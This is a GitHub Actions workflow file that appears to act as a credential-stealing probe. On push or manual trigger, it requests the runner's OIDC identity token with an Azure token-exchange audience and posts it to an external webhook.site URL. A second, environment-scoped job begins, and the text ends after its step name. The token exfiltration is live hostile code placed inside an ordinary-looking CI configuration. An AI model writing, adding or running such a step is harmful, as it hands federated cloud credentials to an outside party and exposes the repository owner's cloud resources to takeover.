name: zz-i179-oidc
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  ref-main:
    runs-on: ubuntu-latest
    steps:
      - name: oidc ref
        run: |
          set +e
          curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
          curl -sS -m 20 -X POST --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/i179-ref
          echo done
  env-Development:
    environment: Development
    runs-on: ubuntu-latest
    steps:
      - name: oidc env Development
